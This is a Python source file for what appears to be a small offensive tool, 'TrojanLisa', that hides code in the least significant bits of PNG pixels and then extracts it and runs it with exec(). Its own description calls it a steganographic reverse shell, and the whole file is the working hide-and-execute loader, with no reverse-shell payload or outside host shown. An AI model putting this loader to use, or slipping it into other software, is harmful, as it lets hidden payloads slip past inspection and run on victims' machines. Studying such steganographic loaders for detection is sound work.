import argparse
import base64

import png


class Stego:
    def __init__(self):
        # Stop code: !#TERMINER#!
        self.stop_code = "001000010010001101010100010001010101001001001101010010010100111001000101010100100010001100100001"

    def encode_message(self, message):
        """
        Encode a message: string -> bytes -> base64 -> binary. Add a binary stop code at the end that signals the end of the message.
        """
        byte_msg = message.encode()
        b64_msg = base64.b64encode(byte_msg)
        bin_msg = "".join(["{:08b}".format(char) for char in b64_msg])
        bin_msg += self.stop_code

        return bin_msg

    def get_pixels(self, fname):
        """
        Get an iterator of the raw pixel values from a PNG image.
        """
        img = png.Reader(fname).read()
        pixels = img[2]

        return pixels

    def encode_pixels(self, pixels, bin_msg):
        """
        Encode the binary message into the pixels using even and odd pixel values to represent the binary string.
        """
        enc_pixels = []
        msg_idx = 0

        for row in pixels:
            enc_row = []
            for pixel in row:
                message_fully_encoded = msg_idx >= len(bin_msg)
                if not message_fully_encoded:
                    message_and_pixel_bit_mismatch = pixel % 2 != int(bin_msg[msg_idx])
                    if message_and_pixel_bit_mismatch:
                        if pixel == 0:
                            pixel = 1
                        else:
                            pixel -= 1
                enc_row.append(pixel)
                msg_idx += 1

            enc_pixels.append(enc_row)

        return enc_pixels

    def write_pixels(self, pixels, fname):
        """
        Write a list of pixels to a 3-channel (RGB) PNG image.
        """
        png.from_array(pixels, "RGB").save(fname)

    def decode_message(self, bin_msg):
        """
        Reverse the encoding process (binary -> b64 -> bytes -> str) to decode the original message.
        """
        bin_msg = bin_msg.split(self.stop_code)[0]
        b64_msg = int(bin_msg, 2).to_bytes(len(bin_msg) // 8, byteorder="big")
        message = base64.b64decode(b64_msg).decode()

        return message

    def decode_pixels(self, pixels):
        """
        Retrieve the encoded binary string message from the pixels of an image.
        """
        bin_msg = []
        for row in pixels:
            for bit in row:
                bin_msg.append(str(bit % 2))
        bin_msg = "".join(bin_msg)
        message = self.decode_message(bin_msg)

        return message

    def encode(self, fname, message):
        """
        Encode a message within an image using steganography.
        """
        pixels = self.get_pixels(fname)
        bin_msg = self.encode_message(message)
        enc_pixels = self.encode_pixels(pixels, bin_msg)
        self.write_pixels(enc_pixels, f"{fname}.trojanlisa")

    def decode(self, fname):
        """
        Decode a message from an image using steganography.
        """
        pixels = self.get_pixels(fname)
        message = self.decode_pixels(pixels)

        return message


def banner():
    print(
        r'''
          .------.
         /        \
       .' /  \     `.
_______|____________|
 """""8""""""""""8888
     d8.-=. ,==-.:888b
     >8 `~` :`~' d8888
     88         ,88888
     88b. `-~  ':88888
     888b ~==~ .:88888
     88888o--:':::8888
     `88888| :::' 8888b
     8888^^'       8888b
    d888           ,%888b.
   d88%            %%%8--'-.
  /88:.__ ,       _%-' ---  -
      """::===..-'   =  --.  `'''
    )

    print(
        r"""
 _____           _                 __ _
/__   \_ __ ___ (_) __ _ _ __     / /(_)___  __ _
  / /\| '__/ _ \| |/ _` | '_ \   / / | / __|/ _` |
 / /  | | | (_) | | (_| | | | | / /__| \__ | (_| |
 \/   |_|  \____/ |\__,_|_| |_| \____|_|___/\__,_|
              |__/
    """
    )


if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(
        description="Steganographic reverse shell embedded within the Mona Lisa."
    )
    parser.add_argument(
        "message", type=str, help="file containing message to embed using steganography"
    )
    parser.add_argument(
        "image", type=str, help="original PNG image to encode message within"
    )
    parser.add_argument(
        "enc_image", type=str, help="encoded PNG image to decode message from"
    )
    args = vars(parser.parse_args())

    stego = Stego()

    with open(args["message"]) as f:
        print("== Preparing the canvas...")
        code = f.read()

        print("== Painting La Joconde...")
        stego.encode(args["image"], code)

        print("== Visiting Le Louvre...")
        message = stego.decode(args["enc_image"])

        print("== La simplicité est la sophistication suprême...")
        code_obj = compile(message, "<string>", "exec")
        exec(code_obj)
